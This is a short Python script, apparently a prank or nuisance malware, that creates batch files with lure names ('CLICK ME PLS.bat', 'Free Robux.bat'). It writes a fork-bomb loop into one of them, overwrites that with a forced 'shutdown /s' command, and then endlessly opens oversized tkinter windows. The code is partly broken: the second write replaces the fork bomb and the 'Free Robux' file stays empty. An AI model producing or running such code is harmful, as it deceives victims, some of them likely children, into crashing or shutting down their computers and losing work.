import tkinter as tk

f = open('CLICK ME PLS.bat', 'x')
f = open('Free Robux.bat', 'x')

with open('CLICK ME PLS.bat', 'w') as f:
  f.write("@echo off\n:crash\nstart\ngoto crash")
  
with open('CLICK ME PLS.bat', 'w') as f:
  f.write("shutdown /s")
while(True):
    window = tk.Tk()
    window.title("hehe")
    window.geometry("4000x4000")
    window.mainloop()